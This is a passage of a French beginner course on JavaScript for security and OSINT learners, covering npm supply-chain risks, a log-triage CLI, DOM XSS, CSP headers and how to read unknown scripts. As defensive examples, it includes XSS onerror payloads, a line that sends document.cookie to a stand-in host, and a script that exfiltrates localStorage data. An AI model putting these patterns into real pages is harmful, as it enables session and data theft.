> Les `require`/`import` en tête d'un fichier révèlent **ses dépendances** : quels modules internes et quels paquets externes il utilise. C'est la première chose à lire pour comprendre la surface d'un script — et repérer une dépendance suspecte (chapitre suivant).

## ❌ Erreur classique

```javascript
// ❌ Oublier le ./ pour un fichier local
const o = require("outils");    // cherche un MODULE INSTALLÉ "outils" → erreur
const o2 = require("./outils"); // ✅ fichier local

// ❌ Oublier d'exporter ce qu'on veut importer
// dans outils.js : pas de module.exports → require renvoie {} vide

// ❌ Mélanger require et import sans configuration adaptée
// → "Cannot use import statement outside a module"
//   Pour débuter, reste sur require (CommonJS).
```

> **Réflexe diagnostic :** `Cannot find module './outils'` ? Vérifie le chemin (`./`, l'extension, le dossier). `undefined` à l'import ? Tu as oublié le `module.exports`.

## Exercices

**Guidé**
1. Crée `outils.js` avec une fonction `estIpPrivee` exportée.
2. Crée `main.js` qui l'importe et l'utilise.
3. Lance `node main.js`.

**Autonome**
Crée un module `ioc.js` qui exporte `extraireIps(texte)` et `extraireEmails(texte)`. Importe-le dans un script qui lit un fichier et affiche les IOC trouvés.

**Défi**
Réorganise ton parser de logs (Partie 2 / chapitre 26) en deux fichiers : un module `analyse.js` (fonctions de parsing et de comptage) et un `cli.js` (lecture du fichier en argument, appel des fonctions, écriture du rapport). C'est une vraie structure d'outil.

## ✅ Tu sais maintenant…

- découper le code en modules ;
- exporter avec `module.exports` et importer avec `require("./fichier")` ;
- distinguer module local (`./`) et module intégré/installé ;
- distinguer `require`, `import` et `<script>` ;
- factoriser une bibliothèque de fonctions réutilisables.

-----

# Chapitre 29 — `npm`, `package.json` et dépendances

## Le minimum à savoir

**`npm`** (*Node Package Manager*) est l'outil qui installe des **bibliothèques** (paquets) écrites par d'autres. Il est installé avec Node.

### Initialiser un projet

```bash
mkdir mon-outil && cd mon-outil
npm init -y          # crée un package.json par défaut
```

Cela crée **`package.json`**, le fichier qui décrit ton projet et ses dépendances :

```json
{
  "name": "mon-outil",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {}
}
```

### Installer un paquet

```bash
npm install nom-du-paquet
```

Cela : télécharge le paquet dans **`node_modules/`**, et l'ajoute aux `dependencies` de `package.json`. Tu l'utilises ensuite avec `require`.

### Scripts npm

Le champ `scripts` de `package.json` définit des commandes pratiques :

```json
"scripts": {
  "start": "node index.js",
  "triage": "node cli.js auth.log"
}
```

```bash
npm run triage     # exécute "node cli.js auth.log"
```

### `package.json` vs `package-lock.json`

- **`package.json`** : la liste de ce que tu veux (tes dépendances déclarées).
- **`package-lock.json`** : les versions **exactes** réellement installées (généré par npm). À conserver pour des installs reproductibles.

## Très utile en pratique : la sécurité des dépendances

> ### 🛡️ Réflexe sécurité (MAJEUR) : dépendances et supply chain
> Installer un paquet npm, c'est **exécuter du code écrit par des inconnus** sur ta machine. C'est puissant, mais c'est une vraie **surface d'attaque** (risques n° 9 et n° 10 de la Boîte à risques). Réflexes :
>
> - **N'installe que ce dont tu as besoin.** Chaque dépendance ajoute du code (et ses propres sous-dépendances).
> - **Vérifie ce que tu installes** : nom exact (attention au *typosquatting* — un paquet au nom presque identique à un paquet connu), popularité, maintenance récente.
> - **Lance `npm audit`** : il signale les vulnérabilités connues dans tes dépendances.
> - **Ne copie-colle jamais une commande `npm install` venue d'une source douteuse** sans comprendre ce qu'elle installe.
> - **Commits le `package-lock.json`** pour des installations reproductibles et traçables.
>
> Les attaques par chaîne d'approvisionnement (un paquet populaire compromis ou un paquet malveillant au nom trompeur) sont une menace réelle. La connaissance de ce risque fait partie du socle défensif.

## Exemple simple

```bash
npm init -y
npm install chalk        # un paquet qui colore le texte du terminal
```

```javascript
// index.js
const chalk = require("chalk");
console.log(chalk.red("⚠️ Alerte"));
console.log(chalk.green("✅ OK"));
```

```bash
node index.js
```

## Application IT / cyber / OSINT

`npm` ouvre l'accès à un immense écosystème utile : parsing avancé, clients d'API, manipulation de données. Mais pour un profil cyber, la **dimension sécurité** prime : comprendre la **supply chain** npm, savoir qu'une dépendance est du code exécuté chez toi, utiliser `npm audit`, et se méfier du *typosquatting* sont des compétences directement transférables à l'analyse de risques d'un projet. Beaucoup d'incidents réels viennent d'une dépendance compromise.

> ### 🔍 Lecture de code inconnu
> Face à un projet inconnu, lis **`package.json`** en premier : ses dépendances révèlent ce que le projet fait et avec quoi. Une dépendance obscure, très récente ou au nom proche d'un paquet connu mérite un examen attentif.

## ❌ Erreur classique

```text
# ❌ Installer un paquet sans vérifier son nom (typosquatting)
npm install crossenv        # ⚠️ faux paquet imitant "cross-env" (cas réel malveillant)

# ❌ Copier une commande npm install d'un tutoriel douteux sans la comprendre

# ❌ Ignorer les avertissements de npm audit
npm audit                   # ✅ lis et traite les vulnérabilités signalées

# ❌ Versionner node_modules (inutile, énorme) — on versionne package.json + lock
```

> **Réflexe diagnostic :** un `require("paquet")` échoue avec `Cannot find module` ? Le paquet n'est pas installé (`npm install paquet`) ou tu n'es pas dans le bon dossier (celui qui contient `node_modules` et `package.json`).

## Exercices

**Guidé**
1. Crée un dossier, lance `npm init -y`, observe le `package.json`.
2. Ajoute un script `"start": "node index.js"`.
3. Crée `index.js` et lance-le avec `npm start`.

**Autonome**
Initialise un projet, installe un petit paquet utilitaire de ton choix (par ex. de coloration ou de date), et écris un `index.js` qui l'utilise. Observe l'apparition de `node_modules` et la mise à jour de `package.json`.

**Défi**
Dans un projet avec quelques dépendances, lance `npm audit` et lis le rapport. Rédige (en commentaire ou dans un fichier) un court mémo : qu'est-ce que le typosquatting, pourquoi `package-lock.json` est important, et trois réflexes pour réduire le risque lié aux dépendances.

## ✅ Tu sais maintenant…

- initialiser un projet avec `npm init` et lire `package.json` ;
- installer un paquet avec `npm install` et l'utiliser via `require` ;
- définir et lancer des scripts npm ;
- distinguer `package.json` et `package-lock.json` ;
- appliquer les réflexes de sécurité supply chain (`npm audit`, typosquatting, prudence).

-----

## 🧩 Mini-projet — Outil CLI Node « log-triage » (chapitres 25 à 29)

La synthèse de la Partie 6 : un vrai outil en ligne de commande, structuré en module + CLI, qui lit un fichier de logs et produit un rapport.

**Structure du projet :**

```text
log-triage/
├── package.json
├── analyse.js     (module : fonctions de parsing)
└── triage.js      (CLI : lecture fichier + rapport)
```

`analyse.js` :

```javascript
// Module de fonctions réutilisables

function parserLignes(contenu) {
  const lignes = contenu.split("\n").map((l) => l.trim()).filter((l) => l !== "");
  const evenements = [];
  for (const ligne of lignes) {
    try {
      const champs = ligne.split(" ");
      const ip = champs[2];
      const statut = champs[4];
      if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
        throw new Error("IP invalide");
      }
      evenements.push({ ip, statut });
    } catch {
      // ligne ignorée silencieusement (on pourrait logger)
    }
  }
  return evenements;
}

function compterEchecsParIp(evenements) {
  const compteur = {};
  for (const e of evenements) {
    if (e.statut === "FAILED") {
      compteur[e.ip] = (compteur[e.ip] || 0) + 1;
    }
  }
  return compteur;
}

function ipsSuspectes(compteur, seuil) {
  return Object.entries(compteur)
    .filter(([ip, n]) => n >= seuil)
    .map(([ip, n]) => ({ ip, echecs: n }));
}

module.exports = { parserLignes, compterEchecsParIp, ipsSuspectes };
```

`triage.js` :

```javascript
const fs = require("fs");
const { parserLignes, compterEchecsParIp, ipsSuspectes } = require("./analyse");

// Arguments CLI
const args = process.argv.slice(2);
const fichier = args[0];
const seuil = Number(args[1]) || 3;

if (!fichier) {
  console.error("Usage : node triage.js <fichier.log> [seuil]");
  process.exit(1);
}

try {
  const contenu = fs.readFileSync(fichier, "utf-8");
  const evenements = parserLignes(contenu);
  const compteur = compterEchecsParIp(evenements);
  const suspectes = ipsSuspectes(compteur, seuil);

  const rapport = {
    fichier,
    seuil,
    total_evenements: evenements.length,
    ip_suspectes: suspectes
  };

  // Afficher ET sauvegarder
  console.log(JSON.stringify(rapport, null, 2));
  fs.writeFileSync("rapport.json", JSON.stringify(rapport, null, 2), "utf-8");
  console.log("\n✅ Rapport écrit dans rapport.json");

  // Code de sortie : 2 si des IP suspectes (utile en script shell)
  process.exit(suspectes.length > 0 ? 2 : 0);
} catch (e) {
  console.error("Erreur :", e.message);
  process.exit(1);
}
```

**Crée un fichier `auth.log` de test :**

```text
2024-01-15 10:00:01 203.0.113.5 login FAILED
2024-01-15 10:00:02 203.0.113.5 login FAILED
2024-01-15 10:00:03 8.8.8.8 login OK
2024-01-15 10:00:04 203.0.113.5 login FAILED
2024-01-15 10:00:05 203.0.113.5 login FAILED
```

**Lance :**

```bash
node triage.js auth.log 3
```

Ce mini-projet est le **pendant JavaScript complet** du parser de logs du cours Python : module réutilisable (`require`/`module.exports`), CLI avec arguments (`process.argv`), lecture de fichier (`fs`), parsing (regex, `split`, objets, `filter`/`map`), production de rapport JSON, gestion d'erreurs (`try/catch`), et code de sortie. Tu disposes maintenant d'un vrai outil d'automatisation défensive.

-----

## ✅ CHECKPOINT 6 — Tu sais écrire de vrais petits outils

Avant la Partie 7, assure-toi de pouvoir, **sans regarder** :

- [ ] exécuter un script avec `node` et utiliser le REPL ;
- [ ] distinguer capacités navigateur vs Node.js ;
- [ ] lire/écrire des fichiers avec `fs` (et gérer `ENOENT`) ;
- [ ] lire des arguments avec `process.argv` et `process.exit` ;
- [ ] découper en modules (`require`/`module.exports`) ;
- [ ] utiliser `npm`, `package.json`, et appliquer les réflexes supply chain ;
- [ ] réaliser le mini-projet CLI log-triage.

Tu sais automatiser en local. La Partie 7 rassemble et approfondit la **sécurité web côté client** semée tout au long du cours.


-----

# Chapitre 30 — XSS et DOM XSS expliqués

## Le minimum à savoir

Le **XSS** (*Cross-Site Scripting*) est l'une des vulnérabilités web les plus répandues. On l'a effleuré au chapitre 15 ; on le pose ici clairement, **à des fins défensives** : comprendre la faille pour l'éviter et la reconnaître.

### Le principe

Un XSS survient quand une page web **insère une donnée non maîtrisée** (venant d'un utilisateur, d'une URL, d'une API) **dans le HTML de la page**, de telle sorte que cette donnée est **interprétée comme du code** plutôt que comme du texte. L'attaquant fait alors exécuter **son** JavaScript dans le navigateur de la victime.

```javascript
// La donnée vient de l'utilisateur (ici, d'un paramètre d'URL)
const recherche = new URL(location.href).searchParams.get("q");

// ☠️ FAILLE : innerHTML interprète la donnée comme du HTML
document.querySelector("#resultat").innerHTML = `Résultats pour : ${recherche}`;
```

Si l'URL est `...?q=<img src=x onerror="...">`, le code dans `onerror` **s'exécute**. L'attaquant peut alors voler des cookies (s'ils ne sont pas `HttpOnly`), lire le LocalStorage, agir au nom de la victime, etc.

### Les grandes familles de XSS

| Type | Où la donnée malveillante transite |
| --- | --- |
| **XSS réfléchi** | dans la requête (URL, formulaire) ; renvoyée immédiatement par le serveur dans la page. |
| **XSS stocké** | enregistrée côté serveur (ex. un commentaire), puis affichée à d'autres victimes. |
| **DOM XSS** | entièrement côté client : c'est **ton JavaScript** qui insère la donnée dans le DOM (cas ci-dessus). |

Le **DOM XSS** est celui qui te concerne le plus directement quand tu écris du JavaScript : il ne dépend pas du serveur, mais de la façon dont **ton code** manipule le DOM.

## Très utile en pratique : les défenses

> ### 🛡️ Réflexe sécurité : éviter le XSS côté client
> 1. **Affiche les données avec `textContent`, jamais `innerHTML`** (chapitre 15). C'est la défense n° 1 du DOM XSS. `textContent` n'interprète jamais le contenu comme du code.
> 2. **N'utilise jamais `eval`** ni équivalents (`new Function`, `setTimeout("code en string")`). `eval` exécute du texte comme du code : risque n° 2 de la Boîte à risques.
> 3. **Méfie-toi des sources de données non maîtrisées** : paramètres d'URL (`location`, `searchParams`), champs de formulaire, réponses d'API, `postMessage`, `document.referrer`.
> 4. **Si tu dois vraiment produire du HTML**, échappe la donnée ou utilise une bibliothèque d'assainissement reconnue — mais pour un débutant, la règle simple « `textContent` » suffit dans l'immense majorité des cas.

### Démonstration défensive (les deux versions côte à côte)

```javascript
const donnee = '<img src=x onerror="console.log(\'code exécuté\')">';

// ☠️ VULNÉRABLE : le code de la donnée s'exécute
zoneA.innerHTML = donnee;

// ✅ SÛR : la donnée est affichée littéralement, jamais exécutée
zoneB.textContent = donnee;
```

## Exemple simple

```javascript
// Affichage sûr d'un paramètre d'URL
const terme = new URL(location.href).searchParams.get("q") || "";
document.querySelector("#titre").textContent = `Recherche : ${terme}`;
// Même si q contient du HTML, il s'affiche comme texte. Pas de XSS.
```

## Application IT / cyber / OSINT

Le XSS est au cœur de la sécurité web. Pour un profil défensif :
- **En revue de code**, tu repères les `innerHTML`, `eval`, et l'insertion de données non maîtrisées : ce sont les points chauds.
- **En analyse**, comprendre le XSS t'aide à lire les rapports de vulnérabilité et à évaluer la gravité d'une faille.
- **En tant que développeur d'outils**, tu construis des interfaces (comme l'inspecteur d'IOC) qui n'introduisent pas elles-mêmes de faille.

C'est aussi la porte d'entrée vers la suite « Web Security » de la collection, où le XSS est étudié en profondeur (toujours dans un cadre légal et défensif).

> ### 🔍 Lecture de code inconnu
> Dans un script inconnu, le trio **`innerHTML` + donnée externe + absence d'échappement** est le motif de DOM XSS à repérer en priorité. De même, tout `eval` est un signal d'alarme.

## ❌ Erreur classique

```javascript
// ❌ Insérer une donnée externe via innerHTML
el.innerHTML = donneeApi.nom;          // ☠️ XSS si nom contient du HTML/JS

// ✅ textContent
el.textContent = donneeApi.nom;

// ❌ Construire du HTML "à la main" avec des données
el.innerHTML = "<p>" + saisie + "</p>"; // ☠️ même problème

// ✅ Créer les éléments et remplir le texte
const p = document.createElement("p");
p.textContent = saisie;                 // ✅
el.appendChild(p);
```

> **Réflexe diagnostic :** dès que tu écris `.innerHTML =`, demande-toi : « cette valeur peut-elle contenir une donnée que je ne contrôle pas ? » Si oui → `textContent` ou création d'éléments.

## Exercices

**Guidé**
1. Crée une page qui lit le paramètre `?q=` de l'URL et l'affiche avec `textContent`.
2. Teste avec `?q=bonjour`, puis `?q=<b>test</b>` : observe qu'il s'affiche littéralement (sûr).

**Autonome**
Reprends ton inspecteur d'IOC (Partie 3). Vérifie qu'aucune donnée n'est insérée via `innerHTML`. Documente en commentaire pourquoi chaque insertion est sûre.

**Défi**
Crée une mini-démo pédagogique à deux zones : l'une affiche une saisie via `innerHTML`, l'autre via `textContent`. Passe une charge utile inoffensive (`<img src=x onerror=console.log('demo')>`) et observe dans la console que seule la version `innerHTML` l'exécute. Rédige une explication de 3 lignes du mécanisme et de la défense. *(But strictement défensif et pédagogique.)*

## ✅ Tu sais maintenant…

- expliquer le principe du XSS (donnée interprétée comme code) ;
- distinguer XSS réfléchi, stocké et DOM XSS ;
- appliquer la défense n° 1 : `textContent` plutôt qu'`innerHTML` ;
- proscrire `eval` et identifier les sources non maîtrisées ;
- repérer le motif de DOM XSS dans du code.

-----

# Chapitre 31 — CSP, en-têtes et défenses navigateur

## Le minimum à savoir

Le navigateur offre des **défenses configurables**, posées par le **serveur** via des **en-têtes HTTP**. Tu ne les écris pas en JavaScript, mais tu dois les **comprendre** : ce sont elles qui encadrent ce que ton JavaScript (et celui d'un attaquant) a le droit de faire.

### CSP (Content Security Policy)

La **CSP** est un en-tête qui **limite ce qu'une page a le droit de charger et d'exécuter**. C'est une défense majeure contre le XSS : même si une injection passe, la CSP peut **empêcher l'exécution** du script injecté.

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Cet exemple dit : « ne charge scripts, styles, images, etc. que depuis **ma propre origine** ; refuse les scripts inline et les scripts d'autres domaines ». Un `<script>` injecté par un attaquant, ou un `onerror=...` inline, est alors **bloqué** par le navigateur.

### Autres en-têtes de sécurité utiles

| En-tête | Rôle |
| --- | --- |
| **`Content-Security-Policy`** | limite sources de scripts/styles/etc. ; anti-XSS. |
| **`Strict-Transport-Security`** (HSTS) | force HTTPS pour les futures visites. |
| **`X-Content-Type-Options: nosniff`** | empêche le navigateur de « deviner » le type d'un fichier. |
| **`X-Frame-Options`** / `frame-ancestors` | empêche l'inclusion de la page dans une iframe (anti-clickjacking). |
| **`Referrer-Policy`** | limite les infos de provenance envoyées. |

### Rappel : les attributs de cookies (chapitre 19)

Les défenses cookies font partie du même arsenal d'en-têtes serveur :

```text
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

- **`HttpOnly`** : cookie invisible à JavaScript → protège contre le vol par XSS.
- **`Secure`** : envoyé seulement en HTTPS.
- **`SameSite`** : limite l'envoi cross-site → atténue le CSRF.

### Rappel : CORS (chapitre 24)

CORS est lui aussi un mécanisme d'en-têtes (`Access-Control-Allow-Origin`), appliqué par le **navigateur**, qui encadre les lectures cross-origin. Rappel essentiel : **CORS protège l'utilisateur, pas le serveur**.

## Très utile en pratique

> ### 🛡️ Réflexe sécurité : lire les en-têtes d'une réponse
> Dans les DevTools, onglet **Réseau** → sélectionne une requête → **En-têtes de réponse**. Tu peux y vérifier la présence de `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, et les attributs `Set-Cookie`. **Leur absence est une faiblesse** souvent relevée dans les audits de sécurité web.

## Exemple simple

Ce que tu observes, tu ne l'écris pas en JS — tu le **lis** :

```text
# En-têtes d'une réponse bien configurée (vue dans DevTools → Réseau)
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=63072000
X-Content-Type-Options: nosniff
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```

## Application IT / cyber / OSINT

L'analyse des en-têtes de sécurité est un geste **quotidien** en sécurité web défensive et en audit. Des outils et des scanners vérifient automatiquement la présence et la qualité de la CSP, de HSTS, des attributs de cookies. Savoir lire ces en-têtes dans les DevTools, comprendre ce que chacun protège, et repérer les manques, est une compétence d'analyste directement opérationnelle. Tu approfondiras cela dans la suite « Web Security ».

> ### 🔍 Lecture de code inconnu
> Une CSP stricte sur une page **réduit la surface** d'un éventuel XSS. Quand tu analyses une page, vérifier la CSP t'indique à quel point un script injecté pourrait (ou non) s'exécuter.

## ❌ Erreur classique

```text
# ❌ Croire que la CSP s'écrit en JavaScript
# → non : c'est un en-tête HTTP, posé par le serveur (ou un <meta http-equiv>).

# ❌ Croire qu'une CSP rend le code invulnérable
# → c'est une défense EN PROFONDEUR : elle réduit l'impact, ne remplace pas
#   le bon usage de textContent et l'évitement d'eval.

# ❌ Confondre les rôles : CORS ≠ CSP
# → CORS encadre les LECTURES cross-origin ; CSP limite ce que la page EXÉCUTE/charge.
```

> **Réflexe diagnostic :** un script légitime est « bloqué » sans erreur JavaScript classique, avec un message mentionnant `Content Security Policy` dans la console ? C'est la **CSP** qui l'empêche de s'exécuter (script inline ou source non autorisée).

## Exercices

**Guidé**
1. Ouvre une grande application web, DevTools → Réseau → la requête principale.
2. Repère, dans les en-têtes de réponse, `Content-Security-Policy` et `Strict-Transport-Security` (si présents).
3. Note ce que la CSP autorise (`script-src`, `default-src`).

**Autonome**
Sur trois sites différents, compare la présence/absence des en-têtes de sécurité (CSP, HSTS, nosniff) et des attributs de cookies. Lequel semble le mieux configuré ? Justifie en deux phrases.

**Défi**
Rédige un mini-mémo « checklist en-têtes de sécurité » : pour chaque en-tête (CSP, HSTS, X-Content-Type-Options, X-Frame-Options) et chaque attribut de cookie (HttpOnly, Secure, SameSite), une ligne expliquant ce qu'il protège. Ce mémo te servira en audit.

## ✅ Tu sais maintenant…

- expliquer ce qu'est une CSP et en quoi elle limite le XSS ;
- citer les en-têtes de sécurité principaux et leur rôle ;
- relier cookies (`HttpOnly`/`Secure`/`SameSite`) et CORS à cet arsenal ;
- lire les en-têtes de réponse dans les DevTools ;
- distinguer les rôles de CORS et de CSP.

-----

# Chapitre 32 — Le réflexe fondamental : le client n'est jamais de confiance

## Le minimum à savoir

C'est **le principe de sécurité le plus important** de tout le cours, celui qui sous-tend la Boîte à risques. Une seule phrase à graver :

> **Tout ce qui s'exécute dans le navigateur est sous le contrôle total de l'utilisateur. Le frontend sert à l'expérience, jamais à la sécurité.**

### Pourquoi le client n'est pas fiable

Un utilisateur (ou un attaquant) peut, sur **ta** page, dans **son** navigateur :
- **lire tout ton code JavaScript** (il est livré en clair) ;
- **le modifier en direct** dans les DevTools ;
- **désactiver JavaScript** entièrement ;
- **changer n'importe quelle valeur** (variables, champs, cases cochées) ;
- **envoyer des requêtes directement au serveur**, en contournant totalement ta page (`curl`, Postman, scripts).

Conséquence : **aucune** garantie de sécurité ne peut reposer sur le code client.

### Reprise de la Boîte à risques sous cet angle

Presque tous les risques du cours découlent de ce principe :

| Risque (Boîte à risques) | Pourquoi le principe s'applique | Chapitre |
| --- | --- | --- |
| Validation client prise pour de la sécurité (n° 3) | L'utilisateur contourne la validation → **valider au serveur**. | 17 |
| Token en LocalStorage / exposé (n° 4, 5) | Tout JS lit le LocalStorage → **ne pas y mettre de secret**. | 18 |
| Bouton masqué = contrôle d'accès (n° 8) | Cacher ≠ interdire → **autoriser au serveur**. | 17, 32 |
| Logique sensible côté frontend (n° 17) | Le code client est lisible/modifiable → **logique sensible au serveur**. | 32 |
| CORS pris pour une sécurité serveur (n° 7) | CORS protège l'utilisateur, pas l'API → **authentifier au serveur**. | 24, 31 |

### Ce qui appartient au client vs au serveur

| Côté client (navigateur) | Côté serveur |
| --- | --- |
| Expérience utilisateur, affichage | **Sécurité, autorisation** |
| Validation de **confort** (retour immédiat) | **Validation qui fait foi** |
| Logique non sensible | **Logique sensible, secrets, clés** |
| Suggestions, ergonomie | **Décisions d'accès aux données** |

## Très utile en pratique

Quand tu conçois ou analyses une application, pose-toi systématiquement : **« cette protection repose-t-elle uniquement sur le client ? »** Si oui, elle est contournable. La vraie barrière est **toujours** au serveur. C'est le réflexe qui distingue une personne qui « écrit du JavaScript » d'une personne qui « pense sécurité web ».

## Exemple simple

```javascript
// ☠️ Anti-pattern : contrôle d'accès côté client
if (utilisateur.role === "admin") {
  afficherBoutonSupprimer();   // cacher le bouton n'empêche personne
}
// L'utilisateur peut appeler l'API de suppression directement.
// → Le SERVEUR doit vérifier le rôle à chaque requête sensible.

// ✅ Côté client : on AMÉLIORE l'expérience (cacher ce qui n'est pas utile),
//    mais on sait que la sécurité réelle est imposée par le serveur.
```

## Application IT / cyber / OSINT

Ce principe est le **socle mental** du pentest web et de l'analyse défensive. Un testeur d'intrusion commence souvent par : modifier les valeurs côté client, rejouer les requêtes en contournant l'interface, désactiver les validations JS — précisément parce qu'il sait que le client n'est pas fiable. Côté défense, concevoir en supposant un client hostile est la base d'une application robuste. Intérioriser ce réflexe te fait progresser plus vite que n'importe quelle astuce technique.

> ### 🔍 Lecture de code inconnu
> Quand tu analyses une application, repère les contrôles qui semblent **uniquement** côté client (validation, masquage de boutons, « rôle » stocké en JS). Ce sont des points où la sécurité réelle dépend entièrement de ce que fait — ou non — le serveur derrière.

## ❌ Erreur classique

```javascript
// ❌ Faire confiance à une valeur venue du client
// prix envoyé par le formulaire = 0.01 → le serveur l'accepte tel quel ☠️
// ✅ Le serveur recalcule/vérifie le prix à partir de SES données.

// ❌ Mettre une clé d'API secrète dans le JavaScript de la page
const API_KEY = "sk_live_secret...";   // ☠️ visible par tous → le secret reste au serveur

// ❌ Croire qu'obfusquer le JS protège la logique
// → l'obfuscation ralentit la lecture, ne protège rien.
```

> **Réflexe diagnostic :** tu t'apprêtes à faire reposer une décision de sécurité sur du code navigateur ? Arrête : déplace-la côté serveur. Le client ne décide jamais des autorisations.

## Exercices

**Guidé**
1. Reprends ton formulaire de validation (chapitre 17).
2. Dans les DevTools, modifie la valeur d'un champ après validation, ou supprime l'attribut qui bloque l'envoi.
3. Constate que la validation client se contourne trivialement. Conclus (commentaire) : la vraie validation est au serveur.

**Autonome**
Liste, pour une application que tu connais, trois protections qui **doivent** être au serveur (autorisation, validation de données, calcul de prix/score) et explique pourquoi le client ne suffit pas.

**Défi**
Rédige une courte note « principe du client non fiable » destinée à un développeur débutant : la phrase-clé, trois exemples de contournement, et la règle « client = expérience, serveur = sécurité ». Relie chaque point à un risque de la Boîte à risques.

## ✅ Tu sais maintenant…

- énoncer le principe : le client n'est jamais de confiance ;
- citer les façons dont un utilisateur contrôle le code client ;
- relier la majorité des risques du cours à ce principe ;
- répartir correctement responsabilités client (expérience) et serveur (sécurité) ;
- adopter le réflexe de conception/analyse « et si le client était hostile ? ».

-----

# Chapitre 33 — Lire un script JavaScript inconnu

## Le minimum à savoir

Compétence finale et très concrète pour un profil cyber/OSINT : **lire du JavaScript trouvé dans une page**, sans forcément tout comprendre, pour en saisir **l'intention et le comportement**. On rassemble ici l'exercice récurrent « 🔍 Lecture de code inconnu » semé tout au long du cours.

### Une méthode de lecture en 6 points

Face à un script inconnu, cherche dans l'ordre :

1. **Les variables et constantes** (`const`, `let`) : quels noms ? Des indices (`token`, `apiKey`, `user`, `url`) ?
2. **Les fonctions** (`function`, `=>`) : leurs **noms** révèlent l'intention (`sendData`, `getToken`, `validate`, `encrypt`).
3. **Les événements** (`addEventListener`) : à quelles actions le code réagit (clic, envoi de formulaire, frappe) ?
4. **Les appels réseau** (`fetch`, `XMLHttpRequest`, `axios`) : **avec quels serveurs** le code communique, **quelles données** il envoie/reçoit.
5. **Les accès au stockage** (`localStorage`, `sessionStorage`, `document.cookie`) : quelles données sont lues/écrites ? Un secret manipulé côté client ?
6. **Les points chauds de sécurité** (`innerHTML`, `eval`, `new Function`, `document.write`) : insertion de données → risque de XSS ; exécution de texte → danger.

### Exemple commenté

```javascript
// 1. Variables : une clé d'API en clair (signal !) et une URL d'API
const apiKey = "abc123";
const endpoint = "https://collecte.exemple.test/track";

// 3. Événement : réagit à l'envoi du formulaire
document.querySelector("#form").addEventListener("submit", async (e) => {
  e.preventDefault();

  // 5. Accès stockage : lit des données locales
  const email = localStorage.getItem("user_email");

  // 4. Appel réseau : ENVOIE des données à un serveur externe
  await fetch(endpoint, {
    method: "POST",
    body: JSON.stringify({ email, key: apiKey })
  });

  // 6. Point chaud : insère une donnée via innerHTML → risque XSS
  document.querySelector("#msg").innerHTML = "Merci " + email;
});
```

**Lecture en clair :** au moment de l'envoi du formulaire, ce script **lit l'email stocké localement** et l'**envoie, avec une clé d'API en clair, à un serveur externe** (`collecte.exemple.test`) ; puis il **affiche l'email via `innerHTML`** (insertion potentiellement dangereuse). Sans connaître chaque détail, tu as identifié : une exfiltration de données vers un tiers, un secret exposé côté client, et un point de XSS. C'est exactement le type d'observation utile en analyse.

## Très utile en pratique

Où trouver le JavaScript d'une page : DevTools → onglet **Sources** (ou *Débogueur*) liste tous les fichiers `.js` chargés ; onglet **Réseau** filtré sur *JS* montre ce qui est téléchargé. Du code minifié (compressé sur une ligne) peut être ré-indenté avec le bouton *Pretty print* `{ }` des DevTools pour le rendre lisible.

> ### 🛡️ Réflexe sécurité : lire n'est pas exécuter
> **Lis** le code, ne le **lance** pas à l'aveugle. Ne copie-colle jamais un script inconnu dans ta console ou dans un fichier que tu exécutes : ce serait exécuter du code que tu ne maîtrises pas (risque n° 10). L'analyse statique (lecture) est sûre ; l'exécution ne l'est pas.

## Exemple simple

```javascript
// Repère en 30 secondes : que fait ce script ?
const c = document.cookie;                    // 5. lit les cookies
fetch("https://x.test/c?d=" + encodeURIComponent(c));  // 4. les envoie ailleurs
// → exfiltration de cookies. Motif typiquement malveillant.
```

## Application IT / cyber / OSINT

C'est une compétence d'analyste **directement opérationnelle** : comprendre le comportement d'une page, repérer un script de pistage ou d'exfiltration, identifier les serveurs contactés (utile en threat intel pour extraire des IOC : domaines, endpoints), et évaluer la dangerosité d'un bout de code. Couplée à tout le cours (tu sais maintenant ce que font `fetch`, `localStorage`, `innerHTML`, les regex…), cette lecture devient rapide et précise. C'est l'un des ponts les plus directs vers le travail réel en SOC, OSINT et sécurité web.

## ❌ Erreur classique

```javascript
// ❌ Exécuter le script pour "voir ce qu'il fait"
// → JAMAIS sur du code inconnu : tu lui donnes ton contexte (cookies, session).

// ❌ Se décourager devant du code minifié
// → utilise "Pretty print" {} des DevTools pour le réindenter.

// ❌ Ignorer les chaînes de caractères
// → URLs, clés, domaines en clair sont souvent les indices les plus parlants.
```

> **Réflexe diagnostic :** code illisible d'un bloc ? Réindente-le (*Pretty print*), puis applique la méthode en 6 points. Concentre-toi sur **fetch**, **stockage** et **innerHTML/eval** : ils racontent l'essentiel du comportement.

## Exercices

**Guidé**
1. Sur une page web réelle, DevTools → Sources, ouvre un fichier `.js`.
2. Applique la méthode : repère un `addEventListener`, un `fetch`, un accès stockage.
3. Résume en deux phrases ce que fait ce bout de code.

**Autonome**
Prends le script « exemple commenté » de ce chapitre (ou un autre court script). Liste séparément : variables sensibles, serveurs contactés, données envoyées, points chauds de sécurité. Conclus sur son intention.

**Défi**
Trouve (sur tes propres pages de lab, ou un script volontairement écrit pour l'exercice) un script qui combine lecture de stockage + `fetch` externe + `innerHTML`. Rédige une mini-analyse défensive : que fait-il, quels IOC en extraire (domaines/endpoints), quels risques, et comment le réécrire proprement (`textContent`, pas de secret côté client). **Reste dans un cadre légal : analyse statique, sur des scripts que tu as le droit d'examiner.**

## ✅ Tu sais maintenant…

- appliquer une méthode de lecture en 6 points à un script inconnu ;
- repérer variables, fonctions, événements, appels réseau, accès stockage, points chauds ;
- déduire l'intention et le comportement d'un script ;
- réindenter du code minifié et localiser le JS d'une page ;
- analyser **sans exécuter**, dans un cadre légal et défensif.

-----

## ✅ CHECKPOINT 7 — Tu comprends la sécurité web côté client

Tu as terminé le parcours principal. Assure-toi de pouvoir, **sans regarder** :

- [ ] expliquer le XSS et le DOM XSS, et la défense `textContent` ;
- [ ] expliquer le rôle d'une CSP et des en-têtes de sécurité ;
- [ ] relier cookies, CORS, CSP dans l'arsenal de défenses navigateur ;
- [ ] énoncer et appliquer « le client n'est jamais de confiance » ;
- [ ] lire un script inconnu avec la méthode en 6 points ;
- [ ] relier chaque risque de la Boîte à risques à son chapitre.

